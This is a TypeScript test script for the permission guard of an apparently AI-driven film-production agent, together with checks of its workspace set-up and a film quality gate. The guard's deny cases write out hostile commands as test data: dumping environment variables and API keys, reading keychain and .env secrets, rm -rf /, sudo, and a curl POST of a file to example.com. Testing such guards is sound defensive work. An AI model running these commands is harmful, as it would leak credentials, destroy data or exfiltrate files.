// Offline test of the film agent (no API call): the guard, the workspace set-up (dry run), the gate on a real film.
//   npx tsx apps/cli/src/dev/film-agent-test.ts
import { mkdtempSync, writeFileSync, existsSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import path from "node:path";
import { guard, runFilmAgent } from "../film-agent/run.js";
import { filmGate } from "../film-agent/gate.js";

const ROOT = path.resolve(process.env.OPUMIA_ROOT ?? process.cwd());
let fails = 0;
const ok = (name: string, cond: boolean, detail = "") => { console.log(`${cond ? "PASS" : "FAIL"} ${name}${detail ? ` — ${detail}` : ""}`); if (!cond) fails++; };

const job = mkdtempSync(path.join(tmpdir(), "film-agent-test-"));
const g = guard(job, ROOT);
const bash = async (command: string) => (await g("Bash", { command })).behavior;
const write = async (file_path: string) => (await g("Write", { file_path, content: "x" })).behavior;
const read = async (file_path: string) => (await g("Read", { file_path })).behavior;

for (const c of ["printenv", "env", "printenv OPUMIA_ANTHROPIC_KEY", "echo $ELEVENLABS_API_KEY", "node -e 'console.log(process.env)'", "python3 -c 'import os;print(os.environ)'",
  "security find-generic-password -s opumia -a X -w", "cat ~/.opumia_keys", "cat .env", "git commit -am x", "git push",
  `echo hi > ${ROOT}/Library/x.txt`, `cp a.mp4 ${ROOT}/Reference/x.mp4`, `rm -rf ${ROOT}/data`, "rm -rf /", "sudo ls",
  "curl -X POST https://example.com -d @facts.json"]) ok(`guard denies: ${c}`, (await bash(c)) === "deny");
for (const c of ["film-tools render --stills 1,5", "film-tools ref watch Ponzi 0 30", `ffmpeg -i ${ROOT}/Library/music/a.mp3 -t 3 public/a.wav`,
  `ls ${ROOT}/Library/music | head`, "rm -f stills/old.jpg", "set -e; film-tools mix", "film-tools gate"]) ok(`guard allows: ${c}`, (await bash(c)) === "allow");
ok("guard: write in the workspace", (await write(path.join(job, "src/Film.tsx"))) === "allow");
ok("guard: write to its memory", (await write(path.join(ROOT, "data/agents/film-agent/magnates-media.md"))) === "allow");
ok("guard: no write to the platform code", (await write(path.join(ROOT, "packages/agents/src/llm.ts"))) === "deny");
ok("guard: no write into Library/", (await write(path.join(ROOT, "Library/x.json"))) === "deny");
ok("guard: no reading a secret", (await read(path.join(process.env.HOME ?? "", ".opumia_keys"))) === "deny");
ok("guard: reading the reference", (await read(path.join(ROOT, "Reference/done.txt"))) === "allow");

// workspace set-up on a scratch job with a narration already made
writeFileSync(path.join(job, "timed-script.json"), JSON.stringify({ durationS: 61.4 }));
writeFileSync(path.join(job, "timing.json"), JSON.stringify({ runs: [{ filmUsd: 1.9 }] }));
const r = await runFilmAgent({ root: ROOT, job, channel: "magnates-media", durationS: 60, maxUsd: 9, model: "claude-sonnet-5-5", dryRun: true, log: () => {} });
ok("dry run makes no API call", r.usd === 0);
ok("workspace: Remotion project", existsSync(path.join(job, "src/Film.tsx")) && existsSync(path.join(job, "src/Root.tsx")));
ok("workspace: length = narration + title", JSON.parse(readFileSync(path.join(job, "src/length.json"), "utf8")).seconds === 64);
ok("workspace: tools, memory, owner notes, spend", ["TOOLS.md", "MEMORY.md", "OWNER.md", "spend.json", ".bin/film-tools"].every((f) => existsSync(path.join(job, f))));
ok("workspace: spend carries the narration's cost", JSON.parse(readFileSync(path.join(job, "spend.json"), "utf8")).before === 1.9);

// the gate on a real rendered film (the hand-made v7): measures run, unfinished bookkeeping fails
const v7 = path.join(ROOT, "out/hand-wirecard-v7");
if (existsSync(path.join(v7, "film_16x9.mp4"))) {
  const gate = await filmGate({ root: ROOT, job: v7, channel: "magnates-media", record: false });
  const by = (id: string) => gate.checks.find((c) => c.id === id);
  ok("gate: v7 picture is 1920×1080 at 24 fps", Boolean(by("film")?.detail.includes("1920×1080 at 24/1")), by("film")?.detail);
  ok("gate: v7 loudness at the channel's", by("loudness")?.pass === true, by("loudness")?.detail);
  ok("gate: v7 type passes", by("type")?.pass === true, by("type")?.detail);
  ok("gate: v7 without credits.json fails sources", by("sources")?.pass === false);
  ok("gate: no REVIEW.md fails", by("review")?.pass === false);
  ok("gate: does not pass an unfinished film", !gate.pass);
} else console.log("SKIP gate on v7 (no film)");

console.log(fails ? `${fails} failed` : "film agent: all passed");
process.exitCode = fails ? 1 : 0;
